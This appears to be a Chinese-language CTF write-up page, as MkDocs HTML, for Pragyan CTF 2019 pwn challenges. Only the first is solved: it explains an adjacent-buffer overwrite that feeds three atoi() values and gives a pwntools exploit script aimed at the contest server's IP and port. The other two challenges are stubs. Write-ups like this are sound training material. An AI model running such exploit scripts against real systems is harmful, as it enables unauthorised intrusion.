@@ -1,0 +1,546 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.4.3">
+    
+    
+      
+        <title>pragyan ctf2019 pwn部分wp</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.30686662.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#fb8c00">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.74668098.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="orange" data-md-color-accent="">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#_1" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="My Docs" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              My Docs
+            </span>
+            <span class="md-header-nav__topic">
+              
+                pragyan ctf2019 pwn部分wp
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="主页" class="md-nav__link">
+      主页
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      CTF WP
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        CTF WP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../Aurora内部赛pwn-writeup/" title="Aurora内部赛pwn writeup" class="md-nav__link">
+      Aurora内部赛pwn writeup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        pragyan ctf2019 pwn部分wp
+      </label>
+    
+    <a href="./" title="pragyan ctf2019 pwn部分wp" class="md-nav__link md-nav__link--active">
+      pragyan ctf2019 pwn部分wp
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    第一题
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    第二题
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    第三题
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../西湖论剑pwn部分writeup/" title="西湖论剑pwn部分writeup" class="md-nav__link">
+      西湖论剑pwn部分writeup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../通过DDCTF两道逆向题练习脱壳/" title="通过DDCTF两道逆向题练习脱壳" class="md-nav__link">
+      通过DDCTF两道逆向题练习脱壳
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Pwn学习笔记
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Pwn学习笔记
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Pwn学习笔记/浅谈glibc-unlink/" title="浅谈glibc-unlink" class="md-nav__link">
+      浅谈glibc-unlink
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    第一题
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    第二题
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    第三题
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>pragyan ctf2019 pwn部分wp</h1>
+                
+                <h3 id="_1"><strong>第一题</strong><a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>源程序：<a href="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/feed%20me-pwn/challenge1">challenge1</a>
+先丢进IDA，F5，分析运行过程。
+程序先生成了3个随机数并输出，然后需要输入一个字符串s：
+<img alt="img" src="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/feed%20me-pwn/0.png?raw=true" />
+<!--more-->
+之后验证s中是否只包含数字字符和负号：
+<img alt="img" src="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/feed%20me-pwn/1.png?raw=true" />
+然后把s,nptr,v15中的字符串使用atoi()转换成整数v9,v10,v11，并满足3个if中的条件即可得到flag：
+<img alt="img" src="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/feed%20me-pwn/2.png?raw=true" />
+虽然我们只输入了字符串s，但观察发现s,nptr,v15是相连的，可以通过写s写穿到其他两个变量中，3个变量大小都为10字节：
+<img alt="img" src="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/feed%20me-pwn/3.png?raw=true" />
+接下来就是解方程，求出v9,v10,v11，然后填到s中并传输。
+这里有个坑，由于需要通过s直接写到nptr,v15，这说明3个变量实际上是没有‘\0’这种分隔符的，一旦调用atoi(s)，就会把后面的数据也读取到s中。因此要考虑怎么分隔3个变量。既然它限制了输入只能是数字字符和负号，数字显然不能分隔，这样只能是用负号把剩下的空间填充。
+exp:
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="n">num</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">num</span><span class="o">+</span><span class="p">(</span><span class="mi">10</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">))</span><span class="o">*</span><span class="s1">&#39;-&#39;</span>
+
+<span class="c1">#io=process(&quot;./challenge1&quot;)</span>
+<span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;159.89.166.12&quot;</span><span class="p">,</span><span class="mi">9800</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:)</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">x</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">)</span>
+<span class="n">x</span><span class="o">=</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">y</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">)</span>
+<span class="n">y</span><span class="o">=</span><span class="n">y</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">z</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">)</span>
+<span class="n">z</span><span class="o">=</span><span class="n">z</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="n">z</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">x</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="n">y</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+<span class="n">z</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">z</span><span class="p">)</span>
+
+<span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">z</span><span class="o">-</span><span class="n">y</span><span class="o">+</span><span class="n">x</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
+<span class="n">b</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="o">+</span><span class="n">y</span><span class="o">-</span><span class="n">z</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
+<span class="n">c</span><span class="o">=</span><span class="p">(</span><span class="n">y</span><span class="o">-</span><span class="n">x</span><span class="o">+</span><span class="n">z</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span>
+
+<span class="n">a</span><span class="o">=</span><span class="n">change</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+<span class="n">b</span><span class="o">=</span><span class="n">change</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+<span class="n">c</span><span class="o">=</span><span class="n">change</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+得到flag：
+<img alt="img" src="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/feed%20me-pwn/4.png?raw=true" /></p>
+<h3 id="_2"><strong>第二题</strong><a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>源程序：<a href="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/secret%20keeper/secure_secrets">secure_secrets</a></p>
+<blockquote>
+<p><a href="https://naivenom.tistory.com/18">参考WP</a>
+WP晚点写</p>
+</blockquote>
+<h3 id="_3"><strong>第三题</strong><a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>源程序：<a href="https://github.com/CP32/pragyan-ctf19/blob/master/pragyan%20ctf19/armoury/armoury">armoury</a></p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../Aurora内部赛pwn-writeup/" title="Aurora内部赛pwn writeup" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Aurora内部赛pwn writeup
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../西湖论剑pwn部分writeup/" title="西湖论剑pwn部分writeup" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                西湖论剑pwn部分writeup
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+  <div class="md-footer-social">
+    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
+    
+      <a href="https://t.me/ginben" class="md-footer-social__link fa fa-telegram"></a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.ac79c3b0.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+        <script src="../../js/extra.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
